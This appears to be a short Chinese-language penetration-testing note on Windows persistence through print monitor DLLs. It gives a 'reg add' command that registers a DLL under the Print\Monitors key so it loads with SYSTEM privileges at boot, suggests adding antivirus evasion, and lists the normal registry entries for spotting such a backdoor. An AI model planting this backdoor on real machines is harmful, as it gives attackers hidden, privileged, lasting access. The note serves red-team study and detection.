
### 设置后门
测试dll可用: `regsvr32 /s /u poc.dll`, poc编译为dll,放到`C:\Windows\System32`目录下，然后设置注册表:

```
reg add "hklm\system\currentcontrolset\control\print\monitors\monitor" /v "Driver" /d "print.dll" /t REG_SZ
```
因为打印机是以`System`权限启动的，一般机器都是开机启动，这个是很不错的后门方式，在dll里面可以增加分离免杀或者更新dll的功能，这个dll可以设置多个，只要键名不一样即可。

### 排查后门

正常情况下打印机的注册表是下面这几个，位置:`\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Print\Monitors\`

* Local Port
* Standard TCP/IP Port
* USB Monitor
* WSD Port

### 参考资料
* <https://wh0ale.github.io/2019/01/23/2019-1-23-%E5%90%8E%E6%B8%97%E9%80%8F%E8%AF%A6%E8%A7%A3/>
* <https://pentestlab.blog/2019/10/28/persistence-port-monitors/>
* <https://xz.aliyun.com/t/8095#toc-11>
* <https://attack.mitre.org/techniques/T1547/010/>
* <https://www.ired.team/offensive-security/persistence/t1013-addmonitor>